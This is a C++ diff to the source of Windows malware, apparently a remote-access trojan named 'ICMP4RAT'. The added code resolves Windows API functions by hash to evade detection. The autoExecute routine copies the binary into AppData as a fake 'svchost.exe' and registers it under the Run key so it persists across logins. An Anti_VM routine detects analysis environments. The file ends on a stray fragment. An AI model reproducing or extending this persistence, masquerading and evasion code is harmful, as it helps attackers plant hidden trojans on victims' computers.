@@ -3,24 +3,40 @@
 #include <iostream>
 #include <string>
 #include <list>
+#include "moduleHash.h"
+
+
+customGetEnvironmentVariableA GetEnvironmentVariableA_c = (customGetEnvironmentVariableA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"GetEnvironmentVariableA"));
+
+customRegOpenKeyExA RegOpenKeyExA_c = (customRegOpenKeyExA)getFunctionAddressByHash((char*)"Advapi32", getHashFromString((char*)"RegOpenKeyExA"));
+
+customRegSetValueExA RegSetValueExA_c = (customRegSetValueExA)getFunctionAddressByHash((char*)"Advapi32", getHashFromString((char*)"RegSetValueExA"));
+
+customRegCloseKey RegCloseKey_c = (customRegCloseKey)getFunctionAddressByHash((char*)"Advapi32", getHashFromString((char*)"RegCloseKey"));
+
+customGetModuleFileNameA GetModuleFileNameA_c = (customGetModuleFileNameA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"GetModuleFileNameA"));
+
+customCreateDirectoryA CreateDirectoryA_c = (customCreateDirectoryA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"CreateDirectoryA"));
+
 
 void autoExecute() {
     CHAR szDir[260];
     CHAR pName[260];
-    GetEnvironmentVariableA("APPDATA", szDir, 260);
+    GetEnvironmentVariableA_c("APPDATA", szDir, 260);
     std::string str(szDir);
     str += "\\ICMP4RAT";
-    GetModuleFileNameA(GetModuleHandle(0), pName, 260);
-    CreateDirectoryA(str.c_str(), NULL);
+    GetModuleFileNameA_c(GetModuleHandle(0), pName, 260);
+    CreateDirectoryA_c(str.c_str(), NULL);
     str += "\\svchost.exe";
     CopyFileA(pName, str.c_str(), FALSE);
 
     char Driver[MAX_PATH];
     HKEY hKey;
     strcpy_s(Driver, str.c_str());
-    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-    RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
-    RegCloseKey(hKey);
+    RegOpenKeyExA_c(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+
+    RegSetValueExA_c(hKey, "testtesttesttesttest", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
+    RegCloseKey_c(hKey);
     
 }
 //
@@ -48,7 +64,7 @@ bool Anti_VM() {
             return false;
         }
     }
-    ///* dll 파일 비교 */
+    /* dll 파일 비교 */
     for (std::string module : modules) {
         if (GetModuleHandleA(module.c_str()) != NULL) {
             return false;
@@ -73,3 +89,10 @@ bool Anti_VM() {
 
     return true;
 }
+
+#include <iostream>
+#include <Windows.h>
+
+
+
+// Define CreateThread function prototype
